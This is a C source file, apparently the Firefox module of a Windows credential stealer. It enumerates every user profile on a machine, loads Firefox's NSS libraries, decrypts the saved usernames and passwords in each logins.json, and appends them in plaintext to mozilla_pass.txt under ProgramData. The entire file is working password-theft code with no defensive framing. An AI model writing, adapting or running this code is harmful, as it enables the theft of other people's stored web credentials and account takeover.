#include "firefox_stealer.h"

int get_profile(char* profiles_ini_path, char* profile) {

	GetPrivateProfileStringA("Profile0", "Path", "", profile, 260, profiles_ini_path);

	for (int i = 0; profile[i]; i++) {
		if (profile[i] == '/') {

			profile[i] = '\\';
			return 1;
		}
	}

	if (GetLastError() == 2) {
		return 0;
	}
	return 1;
}

int load_profiles_path(char* firefox_path, char* profiles_ini_path) {

	my_strcat(firefox_path, "\\Mozilla\\Firefox");
	my_sprintf(profiles_ini_path, "%s\\profiles.ini", firefox_path);

	return 1;
}

int load_firefoxlib() {

	char programfiles_path[260], mozglue_path[260], nss3_path[260], firefox_path[260], * substr;

	get_path(programfiles_path, CSIDL_PROGRAM_FILES);

	if ((substr = my_strstr(programfiles_path, "x86")) != NULL) {
		string_remove_substring(programfiles_path, (char*)" (x86)");
	}

	my_sprintf(firefox_path, "%s%s", programfiles_path, "\\Mozilla Firefox");
	my_sprintf(mozglue_path, "%s%s", firefox_path, "\\mozglue.dll");
	my_sprintf(nss3_path, "%s%s", firefox_path, "\\nss3.dll");

	// nss3.dll must load from original path because it calls other dlls from same location.
	mozglue_addr = LoadLibraryA(mozglue_path);
	nss3_addr = LoadLibraryA(nss3_path);
	if (!mozglue_addr || !nss3_addr) {
		return 0;
	}

	NSS_Init = (NSSInit)GetProcAddress(nss3_addr, "NSS_Init");
	PK11_GetInternalKeySlot = (PK11GetInternalKeySlot)GetProcAddress(nss3_addr, "PK11_GetInternalKeySlot");
	PK11_Authenticate = (PK11Authenticate)GetProcAddress(nss3_addr, "PK11_Authenticate");
	PK11SDR_Decrypt = (PK11SDRDecrypt)GetProcAddress(nss3_addr, "PK11SDR_Decrypt");
	PK11_CheckUserPassword = (PK11CheckUserPassword)GetProcAddress(nss3_addr, "PK11_CheckUserPassword");
	NSS_Shutdown = (NSSShutdown)GetProcAddress(nss3_addr, "NSS_Shutdown");
	PK11_FreeSlot = (PK11FreeSlot)GetProcAddress(nss3_addr, "PK11_FreeSlot");
	mySECItem_FreeItem = (SECItem_FreeItem)GetProcAddress(nss3_addr, "SECITEM_FreeItem");

	return 1;
}

char* decrypt_data(const char* encrypted_data) {

	unsigned char* base64_decoded;
	size_t base64_decoded_length = 0;
	SECItem in, out = { siBuffer, NULL, 0 };
	char* out_data;

	base64_decoded = base64_decode(encrypted_data, my_strlen(encrypted_data), &base64_decoded_length);
	if (!base64_decoded) {
		return 0;
	}

	in.type = siBuffer;
	in.data = base64_decoded;
	in.len = base64_decoded_length;
	if (PK11SDR_Decrypt(&in, &out, NULL) != 0) {
		my_heapfree(base64_decoded);
		return 0;
	}

	out.data[out.len] = '\0';
	if (out_data = (char*)my_heapalloc(out.len + 2)) {
		my_memcpy(out_data, out.data, out.len+1);
	}

	my_heapfree(base64_decoded);
	mySECItem_FreeItem(&out, FALSE);
	return out_data;
	//return (char*)out.data;
}

int nss_authenticate(char* profile_path, PVOID* key_slot, const char* master_pass) {

	if (NSS_Init(profile_path) != SECSuccess) {
		return 0;
	}

	if ((*key_slot = PK11_GetInternalKeySlot()) == NULL) {
		return 0;
	}

	if (master_pass) {
		if (PK11_CheckUserPassword(*key_slot, master_pass) != SECSuccess) {
			free_nss(*key_slot);
			return 0;
		}
	} else {
		if (PK11_CheckUserPassword(*key_slot, "") != SECSuccess) {
			free_nss(*key_slot);
			return 0;
		}
	}

	if (PK11_Authenticate(*key_slot, TRUE, NULL) != SECSuccess) {
		free_nss(*key_slot);
		return 0;
	}
	return 1;
}

int free_nss(void* key_slot) {

	if (key_slot) {
		PK11_FreeSlot(key_slot);
	}
	if (NSS_Shutdown) {
		NSS_Shutdown();
	}
	
	//FreeLibrary(nss3_addr);
	//FreeLibrary(mozglue_addr);
	return 1;
}

int get_firefox_creds(char* profile_path, char* logins_path, const char* master_pass) {

	HANDLE handle, file_to_write;
	void* key_slot = NULL;
	char* loginsjson_buf, *enc_username, *enc_password, *term_string;
	DWORD fileSize = 0, read = 0, bytes_written;
	char* out = NULL, *pout;

	if (!nss_authenticate(profile_path, &key_slot, master_pass)) {
		return 0;
	}
	
	handle = CreateFileA(logins_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (handle == INVALID_HANDLE_VALUE) {
		return 0;
	}

	fileSize = GetFileSize(handle, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		return 0;
	}

	loginsjson_buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize + 1);
	if (!loginsjson_buf) {
		CloseHandle(handle);
		return 0;
	}

	if (!ReadFile(handle, loginsjson_buf, fileSize, &read, NULL)) {
		CloseHandle(handle);
		return 0;
	}

	CloseHandle(handle);
	term_string = loginsjson_buf;
	out = (char*)my_heapalloc(1024 * 64); //64KB
	if (!out) {
		my_heapfree(loginsjson_buf);
		return 0;
	}

	pout = out;
	while (TRUE) {
		char* username = NULL, *password = NULL, *hostname = NULL;

		hostname = term_string;
		hostname = my_strstr(hostname, "\"hostname\":\"");
		if (!hostname) {
			break;
		}

		string_remove_substring(hostname, (char*) "\"hostname\":\"");
		term_string = string_terminate_string(hostname, '"');

		enc_username = term_string + 1;
		enc_username = my_strstr(enc_username, "\"encryptedUsername\":\"");
		string_remove_substring(enc_username, (char*) "\"encryptedUsername\":\"");
		term_string = string_terminate_string(enc_username, '"');

		enc_password = term_string + 1;
		enc_password = my_strstr(enc_password, "\"encryptedPassword\":\"");
		string_remove_substring(enc_password, (char*)"\"encryptedPassword\":\"");
		term_string = string_terminate_string(enc_password, '"');

		if (my_strlen(enc_username)) { username = decrypt_data(enc_username); }
		if (my_strlen(enc_password)) { password = decrypt_data(enc_password); }

		my_sprintf(pout, "url: %s\r\nuser: %s\r\npass: %s\r\n\r\n", hostname, username, password);
		pout += my_strlen(pout);
		if (username) my_heapfree(username);
		if (password) my_heapfree(password);

		term_string++;
	}

	char path[260];
	my_sprintf(path, "%s\\%s", programdata_path, "mozilla_pass.txt");
	file_to_write = CreateFileA(path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file_to_write) {
		char user[260];

		my_sprintf(user, "==%s==\r\n\r\n", profile_path);
		WriteFile(file_to_write, user, my_strlen(user), &bytes_written, NULL);
		WriteFile(file_to_write, out, pout - out, &bytes_written, NULL);
		CloseHandle(file_to_write);
	}

	my_heapfree(out);
	my_heapfree(loginsjson_buf);
	free_nss(key_slot);
	return 1;
}

int firefox_passwords(const char* master_pass) {

	char userprofile_dir[60];
	int profile_size = 60;
	HANDLE find = NULL;
	WIN32_FIND_DATA ffd;

	if (!load_firefoxlib()) {
    /* firefox is not present in the system */
		return 0;
	}

	if (!GetProfilesDirectoryA(userprofile_dir, (DWORD*)&profile_size)) {
		return 0;
	}

	my_strcat(userprofile_dir, "\\*");
	find = FindFirstFileA(userprofile_dir, &ffd);
	if (find == INVALID_HANDLE_VALUE) {
		return 0;
	}

	do {
		if (my_strcmp(ffd.cFileName, ".") == 0 || my_strcmp(ffd.cFileName, "..") == 0) {
			continue;
		}

		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			char appdata_path[260], profiles_ini_path[260], profile[260], profile_path[260], logins_path[260];
			int filename_len;

			if (my_strcmp(ffd.cFileName, "Default") == 0) continue;

			filename_len = my_strlen(userprofile_dir);
			my_memcpy(appdata_path, userprofile_dir, filename_len + 1);
			my_memcpy(appdata_path + filename_len - 1, ffd.cFileName, strlen(ffd.cFileName) + 1);
			my_strcat(appdata_path, "\\AppData\\Roaming");
			if (!PathIsDirectoryA(appdata_path)) {
				continue;
			}

			load_profiles_path(appdata_path, profiles_ini_path);
			if (!get_profile(profiles_ini_path, profile)) {
				continue;
			}

			my_sprintf(profile_path, "%s%s%s", appdata_path, "\\", profile);
			my_sprintf(logins_path, "%s\\logins.json", profile_path);
			if (!get_firefox_creds(profile_path, logins_path, master_pass)) {
				continue;
			}
		}
	} while (FindNextFile(find, &ffd));
	
	FindClose(find);
	return 1;
}